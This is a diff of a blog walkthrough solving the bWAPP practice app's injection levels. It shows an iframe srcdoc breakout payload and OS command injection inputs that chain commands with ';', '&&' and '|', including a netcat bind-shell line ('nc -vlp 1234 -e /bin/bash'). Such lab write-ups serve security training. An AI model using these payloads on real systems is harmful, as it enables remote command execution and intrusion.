@@ -4,7 +4,7 @@ published: true
 title: "A1-Injection | Solutions of bWAPP | Walkthrough of All Levels"
 date: 2020-07-29 23:32:20 +0300
 description: Solutions of HTML Injection - Reflected (GET), HTML Injection - Reflected (POST), HTML Injection - Reflected (Current URL), HTML Injection - Stored (Blog), iFrame Injection, LDAP Injection (Search), Mail Header Injection (SMTP), OS Command Injection, OS Command Injection - Blind, PHP Code Injection, Server-Side Includes (SSI) Injection, SQL Injection (GET/Search), SQL Injection (GET/Select), SQL Injection (POST/Search), SQL Injection (POST/Select), SQL Injection (AJAX/JSON/jQuery), SQL Injection (CAPTCHA), SQL Injection (Login Form/Hero), SQL Injection (Login Form/User), SQL Injection (SQLite), SQL Injection (Drupal), SQL Injection - Stored (Blog), SQL Injection - Stored (SQLite), SQL Injection - Stored (User-Agent), SQL Injection - Stored (XML), SQL Injection - Blind - Boolean-Based, SQL Injection - Blind - Time-Based, SQL Injection - Blind (SQLite), SQL Injection - Blind (Web Services/SOAP), XML/XPath Injection (Login Form), XML/XPath Injection (Search).
-excerpt: "Writeups of all levels in A1-Injection Catagory such as HTML Injection - Reflected GET, POST, OS Command Injection, SQL Injection and XML Injections | PART I"
+excerpt: "Writeups of all levels in A1-Injection Catagory such as HTML Injection - Reflected GET, POST, OS Command Injection, SQL Injection and XML Injections [PART I] "
 image: "https://jaiguptanick.github.io/Blog/images/bwapp/a1/bWAPP_Writeup_solution_logo.png"
 sitemap:
     priority: 0.8
@@ -21,7 +21,7 @@ img {
 
 <h2 align="center" > </h2>
 ---
-Here is a walkthrough and tutorial of the [bWAPP](http://www.itsecgames.com/) which is a vulnerable web application by itsecgames which you can download and test on your local machine. It has a complete list of OWASP vulnerabilities which we can practially test. <b>The best part of using bWAPP is that it is running on our local system so we have access to its source code, so if we got stuck somewhere then we can analyse its source code as it is very neat and describitive having comments wherever necessary. We can see the function being used to restrict or sanatize the input,then can search for its vulnerablity on the web.</b>
+Here is a walkthrough and tutorial of the [bWAPP](http://www.itsecgames.com/) which is a vulnerable web application by itsecgames which you can download and test on your local machine. It has a complete list of OWASP vulnerabilities which we can practially test. <b>The best part of using bWAPP is that it is running on our local system so we have access to its source code, so if we got stuck somewhere then we can analyse its source code as it is very neat and describitive having comments wherever necessary.</b> We can see the function being used to restrict or sanatize the input,then can search for its vulnerablity on the web.
 
 >Hello, today we are going to solve all types of injection of buggy web application such as HTML Injection - Reflected (GET), HTML Injection - Reflected (POST), HTML Injection - Reflected (Current URL), HTML Injection - Stored (Blog), iFrame Injection, LDAP Injection (Search), Mail Header Injection (SMTP), OS Command Injection, OS Command Injection - Blind, PHP Code Injection, Server-Side Includes (SSI) Injection, XML/XPath Injection (Login Form), XML/XPath Injection (Search).
 
@@ -173,13 +173,45 @@ In medium(1) level they are using the ```addslashes() ``` function under xss fun
 
 ![HTML Iframe Injection]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/iframe_4.png)
 
-But we can escape this by using the **srcdoc** attribute of iframe tag as replaces the content of "src" attribute and then inserting another tag for a new iframe tag. The final URL becomes <p> `https://localhost/bwapp/iframei.php?ParamUrl=robots.txt&ParamWidth=250&ParamHeight=250" srcdoc></iframe><iframe src=https://jaiguptanick.github.io/Blog/blog/Web-easy/ width=800 height=300>" ` </p>
+But we can escape this by using the **srcdoc** attribute of iframe tag as replaces the content of "src" attribute and then inserting another tag for a new iframe tag. The final URL becomes <br> `https://localhost/bwapp/iframei.php?ParamUrl=robots.txt&ParamWidth=250&ParamHeight=250" srcdoc></iframe><iframe src=https://jaiguptanick.github.io/Blog/blog/Web-easy/ width=800 height=300>" `
 
 ![HTML Iframe Injection]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/iframe_5.png)
 
 It successfully replaces the iframe restriction, and displayed the required result.
 <h3>Security Level: High</h3>
 This is using `htmlspecialchars()` function which restricts the use of HTML special characters such as ‘<’, ‘>’,’”’, “’”, ‘&’ so we can’t injects HTML as tags are blocked:(
+
+## OS Command Injection
+---
+<h3>Security Level: low</h3>
+OS command injections comes into play when the code is requesting the commandline to run a command,so we can alter the requested command and provide the malicious query.
+Here it is using the <code>shell_exec("nslookup  " . commandi($target))</code> nslookup tool to find the DNS record of the provided domain.
+
+![OS commmand injection]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/os_easy_1.png)
+
+Since it is passing the command ```nslookup www.www.nsa.gov ``` to the commadline we can alter this by using pipe as``` nslookup www.www.nsa.gov | {malicious command} ``` For example:
+
+![OS commmand injection]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/os_easy_1_1.png)
+
+Here we used the ```www.nsa.gov | time ```
+we can even use other commands such as
+```www.nsa.gov ; time ```
+```www.nsa.gov && time ```
+
+The OS Command injection can sometime be very mailcious as we can even get a remote shell by using the command:
+```www.nsa.gov ; nc -vlp 1234 -e /bin/bash ```
+
+<h3>Security Level: medium</h3>
+
+The command ```www.nsa.gov | time ``` works here.
+
+![OS commmand injection]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/os_medium_2.png)
+
+As the function used by the server blocks the use of '&' and ; but we can use | (pipe).
+
+<h3>Security Level: high</h3>
+
+Here they are using ```escapeshellcmd(); ``` function which ensure that user execute only one command user can specify unlimited number of parameters user cannot execute different command. This was exploitable in the earlier versions of PHP. Read more [HERE](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#argument-injection)
 
 All SQL challanges are covered in PART II of A1-Injection.<br>
 <i>Thanks for your patience, I hope you enjoyed reading. Happy Hacking... </i>
